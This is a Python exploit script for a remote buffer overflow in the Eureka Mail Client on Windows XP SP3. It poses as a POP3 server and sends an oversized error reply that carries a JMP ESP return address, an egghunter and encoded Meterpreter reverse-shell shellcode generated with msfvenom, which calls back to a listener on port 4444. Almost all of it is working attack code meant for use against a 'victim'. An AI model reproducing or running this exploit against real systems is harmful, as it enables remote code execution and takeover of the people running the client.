#!/usr/bin/python

banner = """
#----------------------------------------------#
Eureka Public Exploit - Egghunter - Meterpreter Reverse Shell
#----------------------------------------------#
"""

import sys, socket
 
# egghunter (32 bytes)
egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"\x77\x30\x30\x74" # this is the egg: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")
 
#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/alpha_mixed -f c
 
bindshell = ("\x89\xe0\xda\xd3\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39"
"\x6c\x79\x78\x4f\x72\x35\x50\x63\x30\x33\x30\x65\x30\x6d\x59"
"\x38\x65\x34\x71\x4f\x30\x51\x74\x6e\x6b\x72\x70\x64\x70\x6c"
"\x4b\x66\x32\x54\x4c\x4e\x6b\x50\x52\x34\x54\x6e\x6b\x32\x52"
"\x54\x68\x44\x4f\x6f\x47\x72\x6a\x55\x76\x56\x51\x59\x6f\x4e"
"\x4c\x75\x6c\x31\x71\x51\x6c\x75\x52\x56\x4c\x61\x30\x79\x51"
"\x48\x4f\x56\x6d\x67\x71\x5a\x67\x39\x72\x5a\x52\x50\x52\x31"
"\x47\x6c\x4b\x63\x62\x62\x30\x4e\x6b\x72\x6a\x55\x6c\x6e\x6b"
"\x32\x6c\x46\x71\x34\x38\x78\x63\x73\x78\x56\x61\x6a\x71\x56"
"\x31\x6e\x6b\x31\x49\x51\x30\x53\x31\x59\x43\x4c\x4b\x72\x69"
"\x76\x78\x4d\x33\x76\x5a\x73\x79\x6c\x4b\x30\x34\x4c\x4b\x76"
"\x61\x5a\x76\x56\x51\x39\x6f\x4e\x4c\x7a\x61\x68\x4f\x34\x4d"
"\x45\x51\x6f\x37\x44\x78\x6b\x50\x64\x35\x6a\x56\x74\x43\x73"
"\x4d\x6a\x58\x47\x4b\x61\x6d\x76\x44\x63\x45\x5a\x44\x52\x78"
"\x6c\x4b\x32\x78\x45\x74\x76\x61\x79\x43\x70\x66\x6c\x4b\x34"
"\x4c\x32\x6b\x4e\x6b\x32\x78\x55\x4c\x77\x71\x5a\x73\x6e\x6b"
"\x45\x54\x6c\x4b\x47\x71\x48\x50\x4b\x39\x53\x74\x47\x54\x66"
"\x44\x63\x6b\x31\x4b\x50\x61\x63\x69\x53\x6a\x43\x61\x39\x6f"
"\x6b\x50\x31\x4f\x71\x4f\x33\x6a\x4c\x4b\x77\x62\x38\x6b\x6c"
"\x4d\x43\x6d\x45\x38\x45\x63\x74\x72\x35\x50\x37\x70\x32\x48"
"\x43\x47\x54\x33\x45\x62\x73\x6f\x33\x64\x42\x48\x52\x6c\x73"
"\x47\x61\x36\x73\x37\x59\x6f\x39\x45\x48\x38\x6a\x30\x73\x31"
"\x55\x50\x53\x30\x31\x39\x5a\x64\x73\x64\x52\x70\x75\x38\x44"
"\x69\x4b\x30\x42\x4b\x77\x70\x6b\x4f\x39\x45\x33\x5a\x65\x55"
"\x70\x68\x4e\x4c\x32\x30\x42\x69\x4f\x70\x72\x48\x55\x52\x53"
"\x30\x34\x51\x43\x6c\x6b\x39\x68\x66\x76\x30\x32\x70\x50\x50"
"\x30\x50\x71\x50\x72\x70\x31\x50\x66\x30\x70\x68\x6a\x4a\x54"
"\x4f\x39\x4f\x69\x70\x4b\x4f\x6e\x35\x4c\x57\x32\x4a\x74\x50"
"\x62\x76\x51\x47\x62\x48\x4e\x79\x4e\x45\x31\x64\x51\x71\x39"
"\x6f\x68\x55\x6f\x75\x69\x50\x31\x64\x65\x5a\x6b\x4f\x30\x4e"
"\x75\x58\x73\x45\x6a\x4c\x4b\x58\x65\x31\x73\x30\x35\x50\x47"
"\x70\x51\x7a\x53\x30\x53\x5a\x43\x34\x53\x66\x71\x47\x50\x68"
"\x65\x52\x69\x49\x49\x58\x63\x6f\x4b\x4f\x6a\x75\x4d\x53\x79"
"\x68\x53\x30\x33\x4e\x34\x76\x4c\x4b\x30\x36\x50\x6a\x57\x30"
"\x51\x78\x67\x70\x76\x70\x67\x70\x37\x70\x76\x36\x30\x6a\x77"
"\x70\x65\x38\x50\x58\x59\x34\x43\x63\x7a\x45\x39\x6f\x68\x55"
"\x6e\x73\x76\x33\x70\x6a\x57\x70\x50\x56\x71\x43\x63\x67\x71"
"\x78\x46\x62\x79\x49\x49\x58\x63\x6f\x6b\x4f\x69\x45\x4e\x63"
"\x6b\x48\x35\x50\x51\x6d\x57\x52\x76\x38\x52\x48\x67\x70\x53"
"\x70\x55\x50\x63\x30\x33\x5a\x53\x30\x70\x50\x51\x78\x74\x4b"
"\x36\x4f\x64\x4f\x70\x30\x69\x6f\x38\x55\x66\x37\x62\x48\x61"
"\x65\x70\x6e\x32\x6d\x50\x61\x69\x6f\x6a\x75\x43\x6e\x53\x6e"
"\x79\x6f\x64\x4c\x51\x34\x6d\x39\x62\x51\x6b\x4f\x59\x6f\x59"
"\x6f\x65\x51\x4f\x33\x61\x39\x49\x56\x50\x75\x49\x57\x39\x53"
"\x4f\x4b\x4c\x30\x4d\x65\x39\x32\x63\x66\x52\x4a\x73\x30\x73"
"\x63\x69\x6f\x69\x45\x41\x41")
 
buff = ("\x41" * 710);
retn = ("\x53\x93\x42\x7e"); #JMP ESP USER32.DLL XPSP3
nops = ("\x90" * 218);
junk = ("\xcc" * 2000);
sploit = ("-ERR " + buff + retn + egghunter + nops + junk + "w00tw00t" + bindshell);
 
print ("""
##########################################################
#
# Eureka Mail Client Remote Buffer Overflow Exploit (XPSP3)
# Tested On: Windows XPSP3
# Exploit sent!
#
##########################################################
""")
 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 110))
    s.listen(1)
    print ("[*] Listening on port 110.")
    print ("[*] Have someone connect to you.")
    print ("[*] Type <control>-c to exit.")
    conn, addr = s.accept()
    print '[*] Received connection from: ', addr
 
    while 1:
        conn.send(sploit)
    conn.close()
except:
    print ("[*] Done. Wait a bit for the egghunter then connect to the victim on port 4444")
